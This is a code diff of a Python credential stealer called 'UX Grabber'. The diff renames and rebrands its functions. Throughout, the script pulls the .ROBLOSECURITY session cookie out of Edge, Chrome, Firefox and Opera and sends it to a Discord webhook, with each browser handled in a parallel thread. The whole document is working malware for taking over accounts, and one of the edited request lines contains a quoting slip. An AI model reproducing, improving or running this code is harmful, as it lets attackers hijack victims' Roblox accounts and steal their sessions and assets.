@@ -51,43 +51,43 @@ WebHook = " Your discord webhook here "
 
 
 
-def MicrosoftEdge():
+def edge_logger():
     try:
-        cookies = browser_cookie3.edge(domain_name = "roblox.com")
+        cookies = browser_cookie3.edge(domain_name='roblox.com')
         cookies = str(cookies)
-        cookie = cookies.split(".ROBLOSECURITY=")[1].split(" for .roblox.com/>")[0].strip()
-        requests.post(WebHook, json = {"username" : "UX Grabber (FREE)", "content" : f"```{cookie}```"})
+        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
+        requests.post(webhook, json={'username':'UX Grabber 1.2','avatar_url':'https://iili.io/HBpFX2a.jpg,''content':f'```Success ✅ : {cookie}```'})
+    except:
+        pass
+def chrome_logger():
+    try:
+        cookies = browser_cookie3.chrome(domain_name='roblox.com')
+        cookies = str(cookies)
+        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
+        requests.post(webhook, json={'username':'UX Grabber 1.2','avatar_url':'https://iili.io/HBpFX2a.jpg,''content':f'```Success ✅ : {cookie}```'})
     except:
         pass
 
-def GoogleChrome():
+
+def firefox_logger():
     try:
-        cookies = browser_cookie3.chrome(domain_name = "roblox.com")
+        cookies = browser_cookie3.firefox(domain_name='roblox.com')
         cookies = str(cookies)
-        cookie = cookies.split(".ROBLOSECURITY=")[1].split(" for .roblox.com/>")[0].strip()
-        requests.post(WebHook, json = {"username" : "UX Grabber (FREE)", "content" : f"```{cookie}```"})
+        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
+        requests.post(webhook, json={'username':'UX Grabber 1.2','avatar_url':'https://iili.io/HBpFX2a.jpg,''content':f'```Success ✅ : {cookie}```'})
     except:
         pass
 
-def MozillaFirefox():
+def opera_logger():
     try:
-        cookies = browser_cookie3.firefox(domain_name = "roblox.com")
+        cookies = browser_cookie3.opera(domain_name='roblox.com')
         cookies = str(cookies)
-        cookie = cookies.split(".ROBLOSECURITY=")[1].split(" for .roblox.com/>")[0].strip()
-        requests.post(WebHook, json = {"username" : "UX Grabber (FREE)", "content" : f"```{cookie}```"})
+        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
+        requests.post(webhook, json={'username':'UX Grabber 1.2','avatar_url':'https://iili.io/HBpFX2a.jpg,''content':f'```Success ✅ : {cookie}```'})
     except:
         pass
 
-def Opera():
-    try:
-        cookies = browser_cookie3.opera(domain_name = "roblox.com")
-        cookies = str(cookies)
-        cookie = cookies.split(".ROBLOSECURITY=")[1].split(" for .roblox.com/>")[0].strip()
-        requests.post(WebHook, json = {"username" : "UX Grabber (FREE)", "content" : f"```{cookie}```"})
-    except:
-        pass
+browsers = [edge_logger, chrome_logger, firefox_logger, opera_logger]
 
-browsers = [MicrosoftEdge, GoogleChrome, MozillaFirefox, Opera]
-
-for v in browsers:
-    threading.Thread(target = v).start()
+for x in browsers:
+    threading.Thread(target=x,).start()
